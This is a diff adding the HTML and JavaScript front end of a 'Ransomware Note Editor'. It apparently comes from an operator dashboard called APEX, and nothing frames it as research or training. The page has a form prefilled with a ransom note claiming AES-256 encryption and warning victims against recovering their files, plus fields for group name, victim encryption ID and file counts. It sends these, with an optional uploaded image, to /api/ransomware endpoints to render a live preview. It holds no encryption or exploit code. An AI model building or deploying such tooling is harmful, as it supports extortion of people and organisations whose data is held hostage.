@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APEX — Ransomware Note Editor</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #0a0a0a;
+            color: #e5e5e5;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: 
+                linear-gradient(rgba(249, 115, 22, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(249, 115, 22, 0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .header {
+            position: relative;
+            z-index: 1;
+            background: #0f0f0f;
+            border-bottom: 1px solid rgba(249, 115, 22, 0.3);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: #f97316;
+            letter-spacing: 8px;
+            text-shadow: 0 0 20px rgba(249, 115, 22, 0.4);
+        }
+        
+        .header-right a {
+            color: #6b7280;
+            text-decoration: none;
+            font-size: 12px;
+            letter-spacing: 2px;
+            transition: color 0.3s;
+        }
+        
+        .header-right a:hover { color: #f97316; }
+        
+        .main {
+            position: relative;
+            z-index: 1;
+            padding: 20px 30px;
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 900px) {
+            .main { grid-template-columns: 1fr; }
+        }
+        
+        .panel {
+            background: #141414;
+            border: 1px solid rgba(249, 115, 22, 0.2);
+        }
+        
+        .panel-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(249, 115, 22, 0.15);
+            font-size: 13px;
+            letter-spacing: 3px;
+            color: #f97316;
+            text-transform: uppercase;
+        }
+        
+        .panel-body {
+            padding: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 11px;
+            color: #6b7280;
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+        
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 10px 14px;
+            background: #0a0a0a;
+            border: 1px solid rgba(249, 115, 22, 0.2);
+            color: #e5e5e5;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            letter-spacing: 1px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: #f97316;
+            box-shadow: 0 0 10px rgba(249, 115, 22, 0.2);
+        }
+        
+        .form-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        
+        .btn-preview {
+            background: #f97316;
+            color: #0a0a0a;
+            width: 100%;
+        }
+        
+        .btn-preview:hover {
+            background: #fb923c;
+            box-shadow: 0 0 20px rgba(249, 115, 22, 0.4);
+        }
+        
+        .btn-upload {
+            background: transparent;
+            border: 1px solid #f97316;
+            color: #f97316;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .btn-upload:hover {
+            background: rgba(249, 115, 22, 0.1);
+        }
+        
+        .preview-container {
+            background: #000;
+            min-height: 500px;
+            padding: 0;
+            overflow: auto;
+        }
+        
+        .preview-container iframe {
+            width: 100%;
+            height: 600px;
+            border: none;
+            background: #000;
+        }
+        
+        .image-preview {
+            max-width: 200px;
+            max-height: 100px;
+            margin-top: 8px;
+            border: 1px solid rgba(249, 115, 22, 0.3);
+            display: none;
+        }
+        
+        .image-preview.show { display: block; }
+        
+        .back-link {
+            display: inline-block;
+            margin-bottom: 15px;
+            color: #6b7280;
+            text-decoration: none;
+            font-size: 12px;
+            letter-spacing: 2px;
+        }
+        
+        .back-link:hover { color: #f97316; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">🔺 APEX</div>
+        <div class="header-right">
+            <a href="/dashboard">← BACK TO DASHBOARD</a>
+        </div>
+    </div>
+    
+    <div class="main">
+        <!-- Editor -->
+        <div class="panel">
+            <div class="panel-header">✏️ RANSOMWARE NOTE EDITOR</div>
+            <div class="panel-body">
+                <div class="form-group">
+                    <label>Title</label>
+                    <input type="text" id="noteTitle" value="YOUR FILES HAVE BEEN ENCRYPTED" placeholder="Ransom note title">
+                </div>
+                
+                <div class="form-group">
+                    <label>Message</label>
+                    <textarea id="noteMessage" placeholder="Ransom message text">All of your files, documents, databases, and backups have been encrypted with AES-256 military-grade encryption. You cannot access your files without the decryption key. DO NOT attempt to recover files yourself — this will result in PERMANENT data loss.</textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Group Name</label>
+                    <input type="text" id="groupName" value="APEX" placeholder="Hacker group name">
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption ID</label>
+                    <input type="text" id="encryptionId" value="APX-2024-0001" placeholder="Unique encryption ID">
+                </div>
+                
+                <div class="form-group">
+                    <label>Files Encrypted (display count)</label>
+                    <input type="text" id="fileCount" value="1,247" placeholder="e.g., 1,247">
+                </div>
+                
+                <div class="form-group">
+                    <label>Total Data Size</label>
+                    <input type="text" id="totalSize" value="45.3 MB" placeholder="e.g., 45.3 MB">
+                </div>
+                
+                <div class="form-group">
+                    <label>Custom Image (optional)</label>
+                    <input type="file" id="imageUpload" accept="image/*" style="display:none;" onchange="uploadImage()">
+                    <button class="btn btn-upload" onclick="document.getElementById('imageUpload').click()">📷 UPLOAD IMAGE</button>
+                    <img id="imagePreview" class="image-preview" src="" alt="Preview">
+                </div>
+                
+                <button class="btn btn-preview" onclick="updatePreview()">👁️ UPDATE PREVIEW</button>
+            </div>
+        </div>
+        
+        <!-- Preview -->
+        <div class="panel">
+            <div class="panel-header">👁️ LIVE PREVIEW</div>
+            <div class="preview-container">
+                <iframe id="previewFrame" src="about:blank"></iframe>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let uploadedImageUrl = '';
+        
+        function uploadImage() {
+            const file = document.getElementById('imageUpload').files[0];
+            if (!file) return;
+            
+            const formData = new FormData();
+            formData.append('image', file);
+            
+            fetch('/api/ransomware/upload_image', {
+                method: 'POST',
+                body: formData
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.url) {
+                    uploadedImageUrl = data.url;
+                    document.getElementById('imagePreview').src = data.url;
+                    document.getElementById('imagePreview').classList.add('show');
+                    updatePreview();
+                }
+            })
+            .catch(err => console.error('Upload failed:', err));
+        }
+        
+        function updatePreview() {
+            const data = {
+                title: document.getElementById('noteTitle').value,
+                message: document.getElementById('noteMessage').value,
+                image_url: uploadedImageUrl,
+                group_name: document.getElementById('groupName').value,
+                encryption_id: document.getElementById('encryptionId').value,
+                file_count: document.getElementById('fileCount').value,
+                total_size: document.getElementById('totalSize').value
+            };
+            
+            fetch('/api/ransomware/preview', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            })
+            .then(r => r.json())
+            .then(data => {
+                const iframe = document.getElementById('previewFrame');
+                iframe.srcdoc = data.html;
+            })
+            .catch(err => console.error('Preview failed:', err));
+        }
+        
+        // Initial preview
+        updatePreview();
+    </script>
+</body>
+</html>
